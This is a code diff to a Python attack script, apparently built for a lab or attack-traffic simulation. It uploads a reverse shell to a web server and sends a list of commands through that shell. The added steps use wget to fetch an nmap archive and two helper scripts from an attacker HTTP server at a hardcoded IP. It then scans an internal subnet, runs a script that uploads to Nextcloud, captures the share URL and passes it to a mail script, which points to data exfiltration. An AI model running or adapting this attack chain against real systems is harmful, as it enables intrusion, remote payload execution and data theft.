@@ -61,6 +61,7 @@ def handle_connection(client_socket, commands_to_execute):
     """
     print("Reverse shell connected! Executing commands...")
     results = {}
+    captured_url = None  # Store the URL from nc_upload_share.py
     
     try:
         client_socket.settimeout(30)
@@ -70,7 +71,12 @@ def handle_connection(client_socket, commands_to_execute):
         
         # Execute each command and wait for completion
         for idx, command in enumerate(commands_to_execute, 1):
-            print(f"[{idx}/{len(commands_to_execute)}] {command}")
+            # Check if this command needs URL substitution
+            if "{NEXTCLOUD_URL}" in command and captured_url:
+                command = command.replace("{NEXTCLOUD_URL}", captured_url)
+                print(f"[{idx}/{len(commands_to_execute)}] {command} (URL substituted)")
+            else:
+                print(f"[{idx}/{len(commands_to_execute)}] {command}")
             
             # Send command with end marker
             client_socket.send((command + "; echo '<<<CMD_DONE>>>'\n").encode('utf-8'))
@@ -79,6 +85,9 @@ def handle_connection(client_socket, commands_to_execute):
             if './nmap' in command:
                 initial_wait = 120  # Extra time for nmap to start
                 read_timeout = 120  # Longer timeout for nmap scans
+            elif 'mail_test.py' in command:
+                initial_wait = 5  # Give mail script time to start
+                read_timeout = 120  # Longer timeout for mail operations (2 minutes)
             elif 'tar' in command or 'wget' in command:
                 initial_wait = 3
                 read_timeout = 30
@@ -128,6 +137,15 @@ def handle_connection(client_socket, commands_to_execute):
                 print(f"[!] Timeout after {read_timeout}s")
             
             results[command] = output.strip()
+            
+            # Check if this is the nc_upload_share.py command and capture URL
+            if "python3 nc_upload_share.py" in command and output:
+                # Extract URL from output (looking for https:// URLs)
+                import re
+                url_match = re.search(r'https://[^\s]+', output)
+                if url_match:
+                    captured_url = url_match.group(0)
+                    print(f"[*] Captured Nextcloud URL: {captured_url}")
             
             # Print command output
             if output:
@@ -322,22 +340,22 @@ def simulate_pentest_traffic():
 
     print("[+] Pentest simulation complete")
 
-def send_file_via_netcat(target_ip, target_port, filepath):
-    """Send file to target using netcat"""
-    import subprocess
-    print(f"[*] Sending file via netcat to {target_ip}:{target_port}...")
-    try:
-        time.sleep(5)
-        cmd = f"nc {target_ip} {target_port} < {filepath}"
-        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
-        if result.returncode == 0:
-            print(f"[+] File sent successfully")
-        else:
-            print(f"[-] File transfer failed")
-        return result.returncode == 0
-    except Exception as e:
-        print(f"[-] Error: {e}")
-        return False
+# def send_file_via_netcat(target_ip, target_port, filepath):
+#     """Send file to target using netcat"""
+#     import subprocess
+#     print(f"[*] Sending file via netcat to {target_ip}:{target_port}...")
+#     try:
+#         time.sleep(5)
+#         cmd = f"nc {target_ip} {target_port} < {filepath}"
+#         result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
+#         if result.returncode == 0:
+#             print(f"[+] File sent successfully")
+#         else:
+#             print(f"[-] File transfer failed")
+#         return result.returncode == 0
+#     except Exception as e:
+#         print(f"[-] Error: {e}")
+#         return False
 
 def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
     """
@@ -416,16 +434,6 @@ if __name__ == "__main__":
     ATTACKER_IP = "12.0.0.45"  # This machine's IP for HTTP server
     HTTP_PORT = 8000
     
-    # === BASIC ENUMERATION COMMANDS (commented out) ===
-    # COMMANDS = [
-    #     "whoami",
-    #     "id",
-    #     "pwd",
-    #     "uname -a",
-    #     "ls -la /tmp",
-    #     "cat /etc/passwd | head -10",
-    #     "ps aux | head -10"
-    # ]
     
     # Start HTTP server in background thread
     print(f"[*] Starting HTTP server on port {HTTP_PORT}...")
@@ -445,19 +453,19 @@ if __name__ == "__main__":
     # === NETWORK ENUMERATION WITH NMAP ===
     COMMANDS = [
         # Step 1: Get basic system info
+        "pwd",
         "whoami",
         "hostname",
         "uname -a",
         
-        # Step 2: Get network configuration
+        # # Step 2: Get network configuration
         "ip addr show",
         "ip route show",
-        "cat /etc/resolv.conf",
         
-        # Step 3: Check if nmap is installed
-        #"which nmap",
+        # # Step 3: Check if nmap is installed
+        "which nmap",
         
-        # Step 4: Check if we have writable temp directory
+        # # Step 4: Check if we have writable temp directory
         "mkdir -p /tmp/nmap_transfer && cd /tmp/nmap_transfer && pwd",
         
         # Step 5: Remove old nmap archive if exists
@@ -466,10 +474,10 @@ if __name__ == "__main__":
         # Step 5b: Test connectivity to attacker's HTTP server
         f"curl -I http://{ATTACKER_IP}:{HTTP_PORT}/ 2>&1 || wget --spider http://{ATTACKER_IP}:{HTTP_PORT}/ 2>&1",
         
-        # Step 6: Download nmap archive from attacker machine using wget
+        # # Step 6: Download nmap archive from attacker machine using wget
         f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate -c http://{ATTACKER_IP}:{HTTP_PORT}/nmap-x64.tar.gz -O nmap.tar.gz 2>&1",
         
-        # Step 7: Wait for file system sync
+        # # Step 7: Wait for file system sync
         "sync && sleep 1",
         
         # Step 8: Verify download
@@ -507,34 +515,46 @@ if __name__ == "__main__":
     COMMANDS.extend([
         # Step 17a: Run nmap on localhost
         "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./nmap -sV 192.168.20.0/24 -vv 2>&1; else echo 'ERROR: Cannot run nmap - files not found'; fi",
+    
+        # Step 17a-1: Download nc_upload_share.py script
+        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/nc_upload_share.py -O nc_upload_share.py 2>&1",
         
-        # Step 17b: Run simple nmap scan on localhost
-        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 1-1000 127.0.0.1 2>&1; else echo 'ERROR: nmap binary not found'; fi",
+        # Step 17a-2: Verify download
+        "ls -lh /tmp/nmap_transfer/nc_upload_share.py",
         
+        # Step 17a-3: Make it executable
+        "chmod +x /tmp/nmap_transfer/nc_upload_share.py",
+        
+        # Step 17a-4: Check if python3 is available
+        "which python3",
+        
+        # Step 17a-5: Execute the script and capture output
+        "cd /tmp/nmap_transfer && python3 nc_upload_share.py 2>&1",
+        
+        # Step 17a-6: Download mail_test.py script
+        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/mail_test.py -O mail_test.py 2>&1",
+        
+        # Step 17a-7: Verify download of mail_test.py
+        "ls -lh /tmp/nmap_transfer/mail_test.py",
+        
+        # Step 17a-8: Make it executable
+        "chmod +x /tmp/nmap_transfer/mail_test.py",
+        
+        # Step 17a-9: Execute mail_test.py with captured URL as parameter
+        "cd /tmp/nmap_transfer && python3 mail_test.py '{NEXTCLOUD_URL}' 2>&1",
+
         # Step 18: Show network configuration for reference
-        "ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+'",
+        # "ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+'",
         
-        # === COMMENTED OUT: Additional network scans ===
-        # Step 19: Scan the internal network (ping sweep)
-        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sn 10.9.8.0/24 2>&1; else echo 'ERROR: nmap binary not found'; fi",
         
-        # Step 20: Port scan on discovered network (common ports)
-        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 22,80,443,3306,8080 --open 10.9.8.0/24 2>&1; else echo 'ERROR: nmap binary not found'; fi",
+        # # Step 19: Network neighbors and ARP cache
+        # "ip neigh show",
         
-        # Step 21: More detailed scan on web server range
-        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sV -p 80,443,8080 10.9.8.170-180 2>&1; else echo 'ERROR: nmap binary not found'; fi",
+        # # Step 20: Active connections
+        # "netstat -antup 2>&1 || ss -antup",
         
-        # Step 22: Check for other potential targets
-        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 22,21,23,3389 --open 10.9.8.0/24 2>&1; else echo 'ERROR: nmap binary not found'; fi",
-        
-        # Step 19: Network neighbors and ARP cache
-        "ip neigh show",
-        
-        # Step 20: Active connections
-        "netstat -antup 2>&1 || ss -antup",
-        
-        # Step 21: Listening services
-        "netstat -lntp 2>&1 || ss -lntp",
+        # # Step 21: Listening services
+        # "netstat -lntp 2>&1 || ss -lntp",
         
         # Step 22: Cleanup (optional)
         # "rm -rf /tmp/nmap_transfer",
@@ -544,7 +564,7 @@ if __name__ == "__main__":
     print("\n" + "="*60)
     print("[PHASE 1] DIRECTORY FUZZING WITH GOBUSTER")
     print("="*60)
-    # run_gobuster(TARGET_BASE)
+    run_gobuster(TARGET_BASE)
     
     print("\n[*] Waiting 3 seconds before pentest traffic simulation...")
     time.sleep(3)
@@ -553,7 +573,7 @@ if __name__ == "__main__":
     print("\n" + "="*60)
     print("[PHASE 2] PENTEST TRAFFIC SIMULATION")
     print("="*60)
-    # simulate_pentest_traffic()
+    simulate_pentest_traffic()
     
     time.sleep(5)
     
@@ -562,23 +582,24 @@ if __name__ == "__main__":
     print("[PHASE 3] UPLOADING REVERSE SHELL")
     print("="*60)
     
-    # success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
+    success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
     
-    # if success and uploaded_path:
-    #     TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
-    #     print(f"[+] File accessible at: {TARGET_URL}")
-    # elif success:
-    #     print(f"[+] File should be at: {TARGET_URL}")
-    # else:
-    #     print("[-] Upload failed - continuing anyway...")
+    if success and uploaded_path:
+        TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
+        print(f"[+] File accessible at: {TARGET_URL}")
+    elif success:
+        print(f"[+] File should be at: {TARGET_URL}")
+    else:
+        print("[-] Upload failed - continuing anyway...")
     
-    # time.sleep(3)
+    time.sleep(3)
     
     # === Step 4: Execute reverse shell attack ===
     print("\n" + "="*60)
     print("[PHASE 4] REVERSE SHELL ATTACK & ENUMERATION")
     print("="*60)
     results = execute_reverse_shell_attack(TARGET_URL, COMMANDS)
+    
     
     # Display results
     print("\n" + "="*60)
